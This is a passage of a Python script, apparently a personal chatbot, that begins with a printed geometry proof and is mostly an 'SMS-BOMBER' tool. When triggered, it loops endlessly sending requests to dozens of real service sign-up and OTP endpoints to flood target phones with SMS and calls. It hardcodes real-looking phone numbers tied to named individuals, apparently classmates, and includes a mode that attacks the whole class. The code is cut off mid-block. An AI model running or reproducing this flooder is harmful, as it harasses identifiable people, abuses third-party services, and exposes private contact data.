                    '             B                       \n______________________________________  a       Дано: Δ ABC\n'
                    '         4  /  ¯¯--_ 5                          \n           /   2    ¯¯-__                       '
                    'Доказать: ∠1 + ∠2 + ∠3 = 180°\n          /              ¯--_\n         /  1             3  ¯¯-__\n'
                    '________/_________________________¯-___\n       A                               C\n\n'
                    '                                     Доказательство:\n_\n| Посторим прямую a || AC через B\n-\n'
                    '__                                                        _\n|| ∠4 + ∠2 + ∠5 = 180° '
                    '(т.к. углы смежные)                 \ \n-- ∠4 = ∠1 (т.к. накрест лежащие при a || AC и секущей AB) '
                    ' | => ∠1 + ∠2 + ∠3 = 180°\n   ∠5 = ∠3 (т.к. накрест лежащие при a || AC и секущей BC)    /\n          '
                    '                                                ¯\n                                                '
                    '                  Ч Т Д')
                talk('Сумма углов триугольника равна ста восьмидесяти градусам')

    if mess.find('накажи') != -1 or (mess.find('дос') != -1 and mess.find('атака') != -1) or mess.find('задось') != -1:
        banner = '' \
                 '         *****  *     *  *****        ******  ******* *     * ******  ******* ******\n' \
                 '        *     * **   ** *     *       *     * *     * **   ** *     * *       *     * \n' \
                 '        *       * * * * *             *     * *     * * * * * *     * *       *     *\n' \
                 '         *****  *  *  *  *****  ***** ******  *     * *  *  * ******  *****   ******\n' \
                 '              * *     *       *       *     * *     * *     * *     * *       *   *\n' \
                 '              * *     *       *       *     * *     * *     * *     * *       *    *\n' \
                 '         *****  *     *  *****        ******  ******* *     * ******  ******* *     * \n'
        version = "Version: 1.0.6"
        sirvise = '45'
        if mess.find('клас') != -1 or mess.find('всех') != -1:
            _phone = ['79510006255', '79147194077', '79841505820', '79677543694', '79940126087', '79841461606',
                      '79025246745', '79532112364',
                      '79644493025', '79147298968', '79149626665', '79149737742', '79243399223', '79662744517',
                      '79149784708',
                      '79143227561', '79146864725', '79242454191', '79644471504', '79520840008', '79146691936',
                      '79662871237']

            _name = ''
            for index in range(20):
                for x in range(12):
                    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                    password = _name + random.choice(
                        list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                    username = _name + random.choice(
                        list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

                _phone9 = _phone[index][1:]
                _phoneAresBank = '+' + _phone[index][0] + '(' + _phone[index][1:4] + ')' + _phone[index][4:7] + '-' + \
                                 _phone[index][7:9] + '-' + _phone[index][9:11]
                _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
                _phoneOstin = '+' + _phone[index][0] + '+(' + _phone[index][1:4] + ')' + _phone[index][4:7] + '-' + \
                              _phone[index][7:9] + '-' + _phone[index][9:11]
                _phonePizzahut = '+' + _phone[index][0] + ' (' + _phone[index][1:4] + ') ' + _phone[index][4:7] + ' ' + \
                                 _phone[index][7:9] + ' ' + _phone[index][9:11]
                _phoneGorzdrav = _phone[index][1:4] + ') ' + _phone[index][4:7] + '-' + _phone[index][7:9] + '-' + \
                                 _phone[index][9:11]
            iteration = 0

            while True:
                _email = _name[index] + f'{iteration}' + '@gmail.com'
                email = _name[index] + f'{iteration}' + '@gmail.com'
                print('GRAB')
                for index in range(20):
                    try:
                        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                                      data={'phoneNumber': _phone[index], 'countryCode': 'ID', 'name': 'test',
                                            'email': 'mail@mail.com',
                                            'deviceToken': '*'}, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('RuTaxi')
                for index in range(20):
                    try:
                        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9[index]}).json()[
                            "res"]
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('BelkaCar')
                for index in range(20):
                    try:
                        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone[index]},
                                      headers={})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Tinder')
                for index in range(20):
                    try:
                        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                                      data={'phone_number': _phone[index]}, headers={})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Karusel')
                for index in range(20):
                    try:
                        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone[index]}, headers={})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])
                print('Tinkoff')
                for index in range(20):
                    try:
                        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone[index]},
                                      headers={})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('MTS')
                for index in range(20):
                    try:
                        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone[index]}, headers={})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Youla')
                for index in range(20):
                    try:
                        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('PizzaHut')
                for index in range(20):
                    try:
                        requests.post('https://pizzahut.ru/account/password-reset',
                                      data={'reset_by': 'phone', 'action_id': 'pass-recovery',
                                            'phone': _phonePizzahut[index], '_token': '*'})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Rabota')
                for index in range(20):
                    try:
                        requests.post('https://www.rabota.ru/remind', data={'credential': _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Rutube')
                for index in range(20):
                    try:
                        requests.post('https://rutube.ru/api/accounts/sendpass/phone',
                                      data={'phone': '+' + _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone[index] + '/')
                        print('[+]', _phone[index])

                print('Smsint')
                for index in range(20):
                    try:
                        requests.post(
                            'https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                            data={'name': _name[index], 'phone': _phone[index], 'promo': 'yellowforma'})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('oyorooms')
                for index in range(20):
                    try:
                        requests.get(
                            'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9[
                                index] + '&country_code=%2B7&nod=4&locale=en')
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('MVideo')
                for index in range(20):
                    try:
                        requests.post(
                            'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                            params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                                    'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                            data={'phone': _phone[index], 'g-recaptcha-response': '', 'recaptcha': 'on'})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('newnext')
                for index in range(20):
                    try:
                        requests.post('https://newnext.ru/graphql',
                                      json={'operationName': 'registration', 'variables': {
                                          'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone[index],
                                                     'typeKeys': ['Unemployed']}},
                                            'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Sunlight')
                for index in range(20):
                    try:
                        requests.post('https://api.sunlight.net/v3/customers/authorization/',
                                      data={'phone': _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('alpari')
                for index in range(20):
                    try:
                        requests.post(
                            'https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                            json={'client_type': 'personal', 'email': _email[index], 'mobile_phone': _phone[index],
                                  'deliveryOption': 'sms'})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Invitro')
                for index in range(20):
                    try:
                        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode',
                                      data={'phone': _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Sberbank')
                for index in range(20):
                    try:
                        requests.post('https://online.sbis.ru/reg/service/',
                                      json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                            'params': {'phone': _phone[index]}, 'id': '1'})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Psbank')
                for index in range(20):
                    try:
                        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                                      json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов',
                                            'sex': '1',
                                            'birthDate': '10.10.2000', 'mobilePhone': _phone9[index],
                                            'russianFederationResident': 'true',
                                            'isDSA': 'false', 'personalDataProcessingAgreement': 'true',
                                            'bKIRequestAgreement': 'null',
                                            'promotionAgreement': 'true'})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Beltelcom')
                for index in range(20):
                    try:
                        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',
                                      data={'phone': _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Karusel')
                for index in range(20):
                    try:
                        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('KFC')
                for index in range(20):
                    try:
                        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
                                      json={'phone': '+' + _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('carsmile')
                for index in range(20):
                    try:
                        requests.post("https://api.carsmile.com/",
                                      json={"operationName": "enterPhone", "variables": {"phone": _phone[index]},
                                            "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Citilink')
                for index in range(20):
                    try:
                        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone[index] + '/')
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Delitime')
                for index in range(20):
                    try:
                        requests.post("https://api.delitime.ru/api/v2/signup",
                                      data={"SignupForm[username]": _phone[index], "SignupForm[device_type]": 3})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('findclone')
                for index in range(20):
                    try:
                        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Guru')
                for index in range(20):
                    try:
                        requests.post("https://guru.taxi/api/v1/driver/session/verify",
                                      json={"phone": {"code": 1, "number": _phone[index]}})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('ICQ')
                for index in range(20):
                    try:
                        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                                      data={'msisdn': _phone[index], "locale": 'en', 'countryCode': 'ru',
                                            'version': '1',
                                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('InDriver')
                for index in range(20):
                    try:
                        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                                      data={"mode": "request", "phone": "+" + _phone[index],
                                            "phone_permission": "unknown", "stream_id": 0,
                                            "v": 3, "appversion": "3.20.6", "osversion": "unknown",
                                            "devicemodel": "unknown"})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Invitro')
                for index in range(20):
                    try:
                        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                                      data={"password": password[index], "application": "lkp",
                                            "login": "+" + _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Pmsm')
                for index in range(20):
                    try:
                        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('IVI')
                for index in range(20):
                    try:
                        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",
                                      data={"phone": _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Mail.ru')
                for index in range(20):
                    try:
                        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                                      json={"phone": "+" + _phone[index], "api": 2, "email": "email",
                                            "x-email": "x-email"})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('MVideo')
                for index in range(20):
                    try:
                        requests.post(
                            'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                            params={"pageName": "registerPrivateUserPhoneVerificatio"},
                            data={"phone": _phone[index], "recaptcha": 'off', "g-recaptcha-response": ""})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('OK')
                for index in range(20):
                    try:
                        requests.post(
                            "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                            data={"st.r.phone": "+" + _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Plink')
                for index in range(20):
                    try:
                        requests.post('https://plink.tech/register/', json={"phone": _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('qlean')
                for index in range(20):
                    try:
                        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                                      json={"phone": _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('SMSgorod')
                for index in range(20):
                    try:
                        requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Tinder')
                for index in range(20):
                    try:
                        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                                      data={'phone_number': _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Twitch')
                for index in range(20):
                    try:
                        requests.post('https://passport.twitch.tv/register?trusted_request=true',
                                      json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                                            "include_verification_code": True,
                                            "password": password[index], "phone_number": _phone[index],
                                            "username": username[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('CabWiFi')
                for index in range(20):
                    try:
                        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone[index]},
                                      headers={'App-ID': 'cabinet'})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('wowworks')
                for index in range(20):
                    try:
                        requests.post("https://api.wowworks.ru/v2/site/send-code",
                                      json={"phone": _phone[index], "type": 2})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Eda.Yandex')
                for index in range(20):
                    try:
                        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                                      json={"phone_number": "+" + _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Youla')
                for index in range(20):
                    try:
                        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Alpari')
                for index in range(20):
                    try:
                        requests.post(
                            'https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                            json={"client_type": "personal", "email": f"{email[index]}@gmail.ru",
                                  "mobile_phone": _phone[index],
                                  "deliveryOption": "sms"})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('SMS')
                for index in range(20):
                    try:
                        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
                                      data={"phone": _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])

                print('Delivery')
                for index in range(20):
                    try:
                        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone[index]})
                        print('[+]', _phone[index])
                    except:
                        print('[-]', _phone[index])
                try:
                    iteration += 1
                    print(('{} круг пройден.').format(iteration))
                except:
                    break

        else:
            print(banner)
            if mess.find('семен') != -1 or mess.find('семён') != -1:
                print('Семён Куликов:', end=' ')
                _phone = '79147194077'
            elif mess.find('марьян') != -1:
                print('Марьяна Сидоренко:', end=' ')
                _phone = '79841505820'
            elif mess.find('вику') != -1 or mess.find('вика') != -1:
                print('Вика Гринькова:', end=' ')
                _phone = '79677543694'
            elif mess.find('глеб') != -1:
                fam = input("Гречушкин(1) или Голиков(2)").lower()
                if fam == '' or fam.find('греч') != -1 or fam == '1':
                    print('Глеб Гречушкин:', end=' ')
                    _phone = '79084488885'
                else:
                    print('Глеб Голиков:', end=' ')
                    _phone = '79940126087'
            elif mess.find('денис') != -1:
                print('Денис До:', end=' ')
                _phone = '79841461606'
            elif mess.find('диму') != -1 or mess.find('дима') != -1:
                print('Дима Лобовской:', end=' ')
                _phone = '79025246745'
            elif mess.find('егор') != -1:
                print('Егор Панарин:', end=' ')
                _phone = '79532112364'
            elif mess.find('лешу') != -1 or mess.find('лёшу') != -1 or \
                    mess.find('леша') != -1 or mess.find('лёша') != -1:
                fam = input("Каптенор(1) или Еремеев(2) или Краснопеев(3)").lower()
                if fam == '' or fam.find('каптен') != -1 or fam == '1':
                    print('Лёша Каптенор:', end=' ')
                    _phone = '79644493025'
                elif fam == '2' or fam.find('ереме') != -1:
                    print('Лёша Еремеев:', end=' ')
                    _phone = '79147298968'
                else:
                    print('Лёша Краснопеев:', end=' ')
                    _phone = '79149626665'
            elif mess.find('данил') != -1:
                print('Данил Зяблицкий:', end=' ')
                _phone = '79149737742'
            elif mess.find('кристин') != -1:
                print('Кристина Рассказова:', end=' ')
                _phone = '79243399223'
            elif mess.find('аня') != -1 or mess.find('аню') != -1 or mess.find('анну') != -1:
                fam = input("Лударева(1) или Вычужанина(2)").lower()
                if fam == '' or fam.find('луд') != -1 or fam == '1':
                    print('Аня Лударева:', end=' ')
                    _phone = '79662744517'
                else:
                    print('Аня Вычужанина:', end=' ')
                    _phone = '79673860557'
            elif mess.find('наст') != -1 or mess.find('настю') != -1:
                print('Настя Дуровина:', end=' ')
                _phone = '79149784708'
            elif mess.find('петя') != -1 or mess.find('петю') != -1:
                print('Петя Левченко:', end=' ')
                _phone = '79143227561'
            elif mess.find('гошу') != -1 or mess.find('гоша') != -1:
                print('Гоша Савинов:', end=' ')
                _phone = '79146864725'
            elif mess.find('дашу') != -1 or mess.find('даша') != -1:
                print('Даша Мосолова:', end=' ')
                _phone = '79242454191'
            elif mess.find('соню') != -1 or mess.find('соня') != -1:
                print('Соня Киктенко:', end=' ')
                _phone = '79644471504'
            elif mess.find('мишу') != -1 or 'миша' in mess:
                # elif mess.find('мишу') != -1 or mess.find('миша') != -1:
                print('Миша Стручаев :', end=' ')
                _phone = '79520840008'
            elif mess.find('лизу') != -1 or mess.find('лиза') != -1:
                print('Лиза Толмачёва:', end=' ')
                _phone = '79146691936'
            elif mess.find('серого') != -1 or mess.find('серый') != -1 or mess.find('сергея') != -1 or mess.find(
                    'сергей') != -1:
                print('Сергей Транковский:', end=' ')
                _phone = '79662871237'
            elif mess.find('меня') != -1 or mess.find(' я') != -1:
                print('Андрей Задорожный:', end=' ')
                _phone = '79510006255'
            else:
                _phone = input('Hello! Number for attack (79xxxxxxxxx)-->> ')

            if _phone[0] == '+':
                _phone = _phone[1:]
            if _phone[0] == '8':
                _phone = '7' + _phone[1:]
            if _phone[0] == '9':
                _phone = '7' + _phone

            _name = ''
            for x in range(12):
                _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

            _phone9 = _phone[1:]
            _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                                 9:11]
            _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
            _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
            _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
                                                                                                                   9:11]
            _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]

            iteration = 0
            while True:
                _email = _name + '{iteration}' + '@gmail.com'.format(iteration)
                email = _name + '{iteration}' + '@gmail.com'.format(iteration)
                try:
                    requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                                  data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test',
                                        'email': 'mail@mail.com', 'deviceToken': '*'}, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                    print('[+] Grab отправлено!')
                except:
                    print('[-] Grab не отправлено!')

                try:
                    requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
                    print('[+] RuTaxi отправлено!')
                except:
                    print('[-] RuTaxi не отправлено!')

                try:
                    requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
                    print('[+] BelkaCar отправлено!')
                except:
                    print('[-] BelkaCar не отправлено!')

                try:
                    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                                  data={'phone_number': _phone}, headers={})
                    print('[+] Tinder отправлено!')
                except:
                    print('[-] Tinder не отправлено!')

                try:
                    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
                    print('[+] Karusel отправлено!')
                except:
                    print('[-] Karusel не отправлено!')

                try:
                    requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
                    print('[+] Tinkoff отправлено!')
                except:
                    print('[-] Tinkoff не отправлено!')

                try:
                    requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
                    print('[+] MTS отправлено!')
                except:
                    print('[-] MTS не отправлено!')

                try:
                    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
                    print('[+] Youla отправлено!')
                except:
                    print('[-] Youla не отправлено!')

                try:
                    requests.post('https://pizzahut.ru/account/password-reset',
                                  data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                        '_token': '*'})
                    print('[+] PizzaHut отправлено!')
                except:
                    print('[-] PizzaHut не отправлено!')

                try:
                    requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
                    print('[+] Rabota отправлено!')
                except:
                    print('[-] Rabota не отправлено!')

                try:
                    requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
                    print('[+] Rutube отправлено!')
                except:
                    requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
                    print('[+] Citilink отправлено!')

                try:
                    requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                                  data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
                    print('[+] Smsint отправлено!')
                except:
                    print('[-] Smsint не отправлено!')

                try:
                    requests.get(
                        'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
                    print('[+] Oyorooms отправлено!')
                except:
                    print('[-] Oyorooms не отправлено!')

                try:
                    requests.post(
                        'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                        params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                                'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                        data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
                    print('[+] MVideo отправлено!')
                except:
                    print('[-] MVideo не отправлено!')

                try:
                    requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                        'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                                      'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
                    print('[+] Newnext отправлено!')
                except:
                    print('[-] Newnext не отправлено!')

                try:
                    requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
                    print('[+] Sunlight отправлено!')
                except:
                    print('[-] Sunlight не отправлено!')

                try:
                    requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                                  json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                        'deliveryOption': 'sms'})
                    print('[+] Аlpari отправлено!')
                except:
                    print('[-] Аlpari не отправлено!')

                try:
                    requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
                    print('[+] Invitro отправлено!')
                except:
                    print('[-] Invitro не отправлено!')

                try:
                    requests.post('https://online.sbis.ru/reg/service/',
                                  json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                        'params': {'phone': _phone}, 'id': '1'})
                    print('[+] Sberbank отправлено!')
                except:
                    print('[-] Sberbank не отправлено!')

                try:
                    requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                                  json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                                        'birthDate': '10.10.2000', 'mobilePhone': _phone9,
                                        'russianFederationResident': 'true', 'isDSA': 'false',
                                        'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                                        'promotionAgreement': 'true'})
                    print('[+] Psbank отправлено!')
                except:
                    print('[-] Psbank не отправлено!')

                try:
                    requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
                    print('[+] Beltelcom отправлено!')
                except:
                    print('[-] Beltelcom не отправлено!')

                try:
                    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
                    print('[+] Karusel отправлено!')
                except:
                    print('[-] Karusel не отправлено!')

                try:
                    requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
                                  json={'phone': '+' + _phone})
                    print('[+] KFC отправлено!')
                except:
                    print('[-] KFC не отправлено!')

                try:
                    requests.post("https://api.carsmile.com/",
                                  json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                        "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
                    print('[+] Carsmile отправлено!')
                except:
                    print('[-] Carsmile не отправлено!')

                try:
                    requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
                    print('[+] Citilink отправлено!')
                except:
                    print('[-] Citilink не отправлено!')

                try:
                    requests.post("https://api.delitime.ru/api/v2/signup",
                                  data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
                    print('[+] Delitime отправлено!')
                except:
                    print('[-] Delitime не отправлено!')

                try:
                    requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
                    print('[+] findclone звонок отправлен!')
                except:
                    print('[-] Не отправлено!')

                try:
                    requests.post("https://guru.taxi/api/v1/driver/session/verify",
                                  json={"phone": {"code": 1, "number": _phone}})
                    print('[+] Guru отправлено!')
                except:
                    print('[-] Guru не отправлено!')

                try:
                    requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                                  data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                        "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                    print('[+] ICQ отправлено!')
                except:
                    print('[-] ICQ не отправлено!')

                try:
                    requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                                  data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown",
                                        "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown",
                                        "devicemodel": "unknown"})
                    print('[+] InDriver отправлено!')
                except:
                    print('[-] InDriver не отправлено!')

                try:
                    requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                                  data={"password": password, "application": "lkp", "login": "+" + _phone})
                    print('[+] Invitro отправлено!')
                except:
                    print('[-] Invitro не отправлено!')

                try:
                    requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
                    print('[+] Pmsm отправлено!')
                except:
                    print('[-] Pmsm не отправлено!')

                try:
                    requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
                    print('[+] IVI отправлено!')
                except:
                    print('[-] IVI не отправлено!')

                try:
                    requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                                  json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
                    print('[+] Mail.ru отправлено!')
                except:
                    print('[-] Mail.ru не отправлено!')

                try:
                    requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                                  data={"st.r.phone": "+" + _phone})
                    print('[+] OK отправлено!')
                except:
                    print('[-] OK не отправлено!')

                try:
